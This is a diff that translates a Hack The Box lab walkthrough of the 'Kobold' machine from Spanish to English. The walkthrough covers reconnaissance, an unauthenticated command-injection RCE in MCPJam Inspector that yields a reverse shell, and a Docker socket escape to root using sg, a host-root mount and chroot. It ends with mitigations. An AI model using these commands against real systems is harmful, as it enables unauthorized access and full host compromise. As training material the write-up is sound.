@@ -2,14 +2,14 @@
 title: "HTB Walkthrough: Kobold"
 date: 2026-06-01
 draft: false
-description: "Walkthrough completo de la máquina Kobold de Hack The Box. Dificultad Easy, OS Linux. RCE sin autenticación en MCPJam Inspector 1.4.2 (CVE-2026-23744) vía el endpoint /api/mcp/connect → shell como ben → acceso al socket Docker a través del grupo operator con sg docker → montaje del filesystem raíz del host y chroot para obtener root."
+description: "Full walkthrough of the Kobold machine from Hack The Box. Easy difficulty, Linux. Unauthenticated RCE on MCPJam Inspector 1.4.2 (CVE-2026-23744) via the /api/mcp/connect endpoint → shell as ben → Docker socket access through the operator group with sg docker → mount the host root filesystem and chroot to get root."
 tags: ["HackTheBox", "Linux", "Easy", "CVE-2026-23744", "MCPJam", "RCE", "Docker", "DockerEscape", "sg", "PrivEsc", "MCP", "kobold", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **Kobold** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux**. La explotación pasa por **CVE-2026-23744**, una RCE sin autenticación en MCPJam Inspector 1.4.2: el endpoint `/api/mcp/connect` pasa el campo `command` directamente a `child_process.spawn()` sin ninguna validación. La escalada a root explota que el usuario `ben` pertenece al grupo `operator`, que tiene permisos sobre el socket Docker — accesible mediante `sg docker` sin necesidad de logout. Una vez con acceso al daemon Docker, montamos el filesystem del host y obtenemos root con `chroot`.
+Walkthrough of **Kobold** on Hack The Box. **Easy** difficulty machine running **Linux**. Exploitation goes through **CVE-2026-23744**, an unauthenticated RCE in MCPJam Inspector 1.4.2: the `/api/mcp/connect` endpoint passes the `command` field directly to `child_process.spawn()` without any validation. Privilege escalation to root exploits the fact that user `ben` belongs to the `operator` group, which has permissions over the Docker socket — accessible via `sg docker` without needing to log out. With access to the Docker daemon, we mount the host filesystem and get root with `chroot`.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
@@ -18,21 +18,21 @@ Resolución de **Kobold** en Hack The Box. Máquina de dificultad **Easy** con s
 
 ---
 
-## 🗺️ Información de la Máquina
+## 🗺️ Machine Info
 
-| Campo          | Detalle                                                                                     |
+| Field          | Detail                                                                                      |
 |----------------|---------------------------------------------------------------------------------------------|
-| **Nombre**     | Kobold                                                                                      |
+| **Name**       | Kobold                                                                                      |
 | **OS**         | Linux (Ubuntu)                                                                              |
-| **Dificultad** | Easy                                                                                        |
+| **Difficulty** | Easy                                                                                        |
 | **IP**         | 10.129.6.231                                                                                |
-| **Técnicas**   | CVE-2026-23744 · MCPJam RCE · Docker socket escape · `sg` group bypass · `chroot` privesc  |
+| **Techniques** | CVE-2026-23744 · MCPJam RCE · Docker socket escape · `sg` group bypass · `chroot` privesc  |
 
 ---
 
-## 1. Reconocimiento
+## 1. Reconnaissance
 
-### 1.1 Escaneo de Puertos
+### 1.1 Port Scan
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.6.231
@@ -50,11 +50,11 @@ PORT     STATE SERVICE
 echo "10.129.6.231 kobold.htb" >> /etc/hosts
 ```
 
-> **💡 Superficie de ataque:** dos puertos web (80/443) y un servicio desconocido en 3552. El foco inicial es la aplicación web.
+> **💡 Attack surface:** two web ports (80/443) and an unknown service on 3552. Initial focus is the web application.
 
 ---
 
-## 2. Enumeración de Subdominios
+## 2. Subdomain Enumeration
 
 ```bash
 gobuster vhost -u "https://kobold.htb" \
@@ -72,18 +72,18 @@ Found: mcp.kobold.htb   [Status: 200, Size: 466]
 echo "10.129.6.231 bin.kobold.htb mcp.kobold.htb" >> /etc/hosts
 ```
 
-- `bin.kobold.htb` → Instancia de **PrivateBin** (compartición de texto/código). Corre en un contenedor Docker en el puerto interno 8080.
-- `mcp.kobold.htb` → Instancia de **MCPJam Inspector versión 1.4.2** — vulnerable al **CVE-2026-23744**.
+- `bin.kobold.htb` → **PrivateBin** instance (text/code sharing). Runs in a Docker container on internal port 8080.
+- `mcp.kobold.htb` → **MCPJam Inspector version 1.4.2** — vulnerable to **CVE-2026-23744**.
 
 ---
 
-## 3. Explotación — CVE-2026-23744 (MCPJam Inspector RCE)
+## 3. Exploitation — CVE-2026-23744 (MCPJam Inspector RCE)
 
-### 3.1 La Vulnerabilidad
+### 3.1 The Vulnerability
 
-El endpoint `/api/mcp/connect` de MCPJam Inspector 1.4.2 acepta un `serverConfig` con el campo `command`, que se pasa directamente a `child_process.spawn()` **sin validación ni autenticación**. Podemos especificar `bash` como comando y una reverse shell como argumento.
+The `/api/mcp/connect` endpoint of MCPJam Inspector 1.4.2 accepts a `serverConfig` with the `command` field, which is passed directly to `child_process.spawn()` **without validation or authentication**. We can specify `bash` as the command and a reverse shell as the argument.
 
-### 3.2 Ejecución del Exploit
+### 3.2 Exploit Execution
 
 ```bash
 nc -lvnp 4444
@@ -102,7 +102,7 @@ curl -k https://mcp.kobold.htb/api/mcp/connect \
   }'
 ```
 
-> **💡 `-k`** ignora el certificado TLS autofirmado del servidor.
+> **💡 `-k`** ignores the server's self-signed TLS certificate.
 
 ```
 Connection received on 10.129.6.231
@@ -114,9 +114,9 @@ ben@kobold:~$ id
 uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 ```
 
-> ✅ **Shell obtenida como `ben`.** El grupo `operator` es relevante — lo retomaremos en la escalada.
+> ✅ **Shell obtained as `ben`.** The `operator` group is relevant — we'll come back to it during escalation.
 
-### 3.3 Estabilización de la TTY
+### 3.3 TTY Stabilization
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -134,13 +134,13 @@ stty rows 40 cols 150; reset
 ben@kobold:~$ cat user.txt
 ```
 
-> 🔑 Flag de usuario obtenida.
+> 🔑 User flag obtained.
 
 ---
 
-## 5. Escalada de Privilegios — Docker Socket Escape vía `sg`
+## 5. Privilege Escalation — Docker Socket Escape via `sg`
 
-### 5.1 Enumeración del Entorno Docker
+### 5.1 Docker Environment Enumeration
 
 ```bash
 ben@kobold:~$ docker ps
@@ -151,7 +151,7 @@ permission denied while trying to connect to the Docker daemon socket at
 unix:///var/run/docker.sock: connect: permission denied
 ```
 
-`ben` no pertenece al grupo `docker` directamente. Pero pertenece al grupo **`operator`** — probamos ejecutar en su contexto con `sg`:
+`ben` doesn't belong to the `docker` group directly. But it belongs to the **`operator`** group — we try running in its context with `sg`:
 
 ```bash
 ben@kobold:~$ sg docker -c "docker ps"
@@ -163,25 +163,25 @@ CONTAINER ID   IMAGE                               COMMAND                  STAT
                                                                             127.0.0.1:8080->8080/tcp  bin
 ```
 
-> **💡 `sg <grupo> -c "<cmd>"`** ejecuta un comando con el GID efectivo del grupo especificado, sin necesidad de logout/login. Funciona porque `operator` tiene permisos sobre `/var/run/docker.sock`, aunque `ben` no lo vea en su listado de grupos principal.
+> **💡 `sg <group> -c "<cmd>"`** executes a command with the specified group's effective GID, without needing to log out/log in. It works because `operator` has permissions over `/var/run/docker.sock`, even though `ben` doesn't see it in the primary group listing.
 
-### 5.2 Por Qué el Socket Docker Permite Escalar a Root
+### 5.2 Why Docker Socket Access Equals Root
 
-El socket `/var/run/docker.sock` permite controlar el daemon Docker, que corre como root. Con acceso a ese socket podemos lanzar un contenedor con el **filesystem raíz del host montado** (`-v /:/mnt`) y ejecutarlo como UID 0 (`-u 0`). Una vez dentro, `chroot /mnt` cambia nuestra raíz al filesystem del host, obteniendo acceso total como root.
+The `/var/run/docker.sock` socket controls the Docker daemon, which runs as root. With access to that socket we can launch a container with the **host root filesystem mounted** (`-v /:/mnt`) and run it as UID 0 (`-u 0`). Once inside, `chroot /mnt` changes our root to the host filesystem, giving us full root access.
 
-### 5.3 Escape al Host
+### 5.3 Escape to Host
 
 ```bash
 ben@kobold:~$ sg docker -c "docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2"
 ```
 
-| Parámetro | Efecto |
+| Parameter | Effect |
 |---|---|
-| `--rm` | Elimina el contenedor al salir (limpieza) |
-| `-it` | Terminal interactiva |
-| `-u 0` | Ejecutar como UID 0 (root) dentro del contenedor |
-| `--entrypoint sh` | Sobreescribe el entrypoint para obtener una shell directamente |
-| `-v /:/mnt` | Monta el filesystem raíz del **host** en `/mnt` dentro del contenedor |
+| `--rm` | Remove container on exit (cleanup) |
+| `-it` | Interactive terminal |
+| `-u 0` | Run as UID 0 (root) inside the container |
+| `--entrypoint sh` | Override entrypoint to get a shell directly |
+| `-v /:/mnt` | Mount the **host** root filesystem at `/mnt` inside the container |
 
 ```bash
 /var/www # chroot /mnt sh
@@ -192,7 +192,7 @@ ben@kobold:~$ sg docker -c "docker run --rm -it -u 0 --entrypoint sh -v /:/mnt p
 uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),27(sudo)
 ```
 
-> ✅ **Root obtenido. `chroot /mnt` hace que todos los comandos operen sobre el sistema host real con privilegios de root.**
+> ✅ **Root obtained. `chroot /mnt` makes all commands operate on the real host system with root privileges.**
 
 ---
 
@@ -202,37 +202,37 @@ uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10
 # cat /root/root.txt
 ```
 
-> 🏁 Flag de root obtenida.
+> 🏁 Root flag obtained.
 
 ---
 
-## 7. Resumen y Lecciones Aprendidas
+## 7. Summary and Lessons Learned
 
-**Ruta de compromiso:**
+**Compromise path:**
 
-1. **Recon** → Puertos 22, 80, 443, 3552. Virtual host `kobold.htb`.
-2. **Gobuster vhost** → Subdominios `bin.kobold.htb` (PrivateBin) y `mcp.kobold.htb` (MCPJam Inspector 1.4.2).
-3. **CVE-2026-23744** → `/api/mcp/connect` sin validación → `bash` como `command` → reverse shell como `ben`.
-4. **`id`** → `ben` pertenece al grupo `operator`.
-5. **`sg docker`** → acceso al socket Docker a través del GID de `operator`.
-6. **`docker run -u 0 -v /:/mnt`** → contenedor root con el host montado.
-7. **`chroot /mnt`** → filesystem del host como root.
+1. **Recon** → Ports 22, 80, 443, 3552. Virtual host `kobold.htb`.
+2. **Gobuster vhost** → Subdomains `bin.kobold.htb` (PrivateBin) and `mcp.kobold.htb` (MCPJam Inspector 1.4.2).
+3. **CVE-2026-23744** → `/api/mcp/connect` without validation → `bash` as `command` → reverse shell as `ben`.
+4. **`id`** → `ben` belongs to the `operator` group.
+5. **`sg docker`** → Docker socket access through `operator`'s GID.
+6. **`docker run -u 0 -v /:/mnt`** → root container with host mounted.
+7. **`chroot /mnt`** → host filesystem as root.
 
-**Lo que aprendí con esta máquina:**
+**What I learned from this machine:**
 
-- **`child_process.spawn()` con input no validado es RCE directa.** MCPJam pasaba el campo `command` de la petición JSON directamente al spawner de procesos sin ningún tipo de lista blanca ni autenticación. En aplicaciones Node.js que necesitan ejecutar subprocesos, la única forma segura es construir la lista de argumentos de forma estática — nunca interpolando input de usuario — y aplicar autenticación antes de cualquier endpoint que interactúe con el sistema.
+- **`child_process.spawn()` with unvalidated input is direct RCE.** MCPJam passed the `command` field from the JSON request directly to the process spawner with no whitelist or authentication. In Node.js applications that need to execute subprocesses, the only safe approach is to build the argument list statically — never interpolating user input — and apply authentication before any endpoint that interacts with the system.
 
-- **La pertenencia a grupos secundarios puede no ser obvia en la salida de `id`, pero `sg` la materializa.** `ben` no aparecía en el grupo `docker`, pero `operator` tenía permisos sobre el socket. Enumerar `/var/run/docker.sock` y cruzar con los grupos del usuario (incluyendo grupos indirectos) es un paso que conviene automatizar en cualquier script de enumeración post-explotación.
+- **Secondary group membership may not be obvious in `id` output, but `sg` materializes it.** `ben` didn't appear in the `docker` group, but `operator` had permissions over the socket. Enumerating `/var/run/docker.sock` and cross-referencing with user groups (including indirect groups) is a step worth automating in any post-exploitation enumeration script.
 
-- **El acceso al socket Docker equivale a root en el host, sin excepción.** No importa si el usuario no tiene `sudo`, si está en un contenedor, o si los permisos del sistema parecen restringidos — si puede hablar con `/var/run/docker.sock`, tiene root. Esta máquina lo ilustra de forma limpia: la "restricción" de que `ben` no estuviera en el grupo `docker` era irrelevante porque `operator` abría la misma puerta por el lado.
+- **Docker socket access equals host root, without exception.** It doesn't matter whether the user lacks `sudo`, is inside a container, or system permissions appear restricted — if they can talk to `/var/run/docker.sock`, they have root. This machine illustrates it cleanly: the "restriction" that `ben` wasn't in the `docker` group was irrelevant because `operator` opened the same door from the side.
 
-- **`sg` es una herramienta legítima del sistema que puede usarse como vector de escalada.** Muchos post-exploitation guides no la mencionan, pero en cualquier sistema donde un usuario pertenece a un grupo secundario con permisos elevados sobre un recurso crítico, `sg` permite materializar esos permisos en un comando sin modificar la sesión actual. Vale la pena tenerla en el radar junto a `newgrp` y similares.
+- **`sg` is a legitimate system tool that can be used as an escalation vector.** Many post-exploitation guides don't mention it, but in any system where a user belongs to a secondary group with elevated permissions over a critical resource, `sg` materializes those permissions in a command without modifying the current session. Worth keeping in mind alongside `newgrp` and similar tools.
 
-**Mitigaciones:**
+**Mitigations:**
 
-| Vector | Mitigación |
+| Vector | Mitigation |
 |--------|------------|
-| CVE-2026-23744 — MCPJam RCE en `/api/mcp/connect` | Actualizar MCPJam Inspector; no exponer el inspector sin autenticación; validar y usar lista blanca de comandos permitidos |
-| Socket Docker accesible vía grupo `operator` | Nunca dar acceso a `/var/run/docker.sock` a usuarios no privilegiados; usar `rootless Docker` o `Podman` donde sea posible |
-| `sg docker` permite bypass del grupo | Auditar qué grupos tienen permisos sobre el socket; restringir con `chmod`/`chown`; considerar `ACL` de filesystem para control más granular |
-| `docker run -v /:/mnt` permite leer/escribir el host completo | Usar `--read-only` y perfiles `seccomp`/`AppArmor`; nunca montar el filesystem raíz del host en contenedores de producción |
+| CVE-2026-23744 — MCPJam RCE on `/api/mcp/connect` | Update MCPJam Inspector; don't expose the inspector without authentication; validate and whitelist allowed commands |
+| Docker socket accessible via `operator` group | Never grant `/var/run/docker.sock` access to unprivileged users; use rootless Docker or Podman where possible |
+| `sg docker` bypasses group restriction | Audit which groups have permissions over the socket; restrict with `chmod`/`chown`; consider filesystem ACLs for finer control |
+| `docker run -v /:/mnt` allows reading/writing the full host | Use `--read-only` and `seccomp`/`AppArmor` profiles; never mount the host root filesystem in production containers |
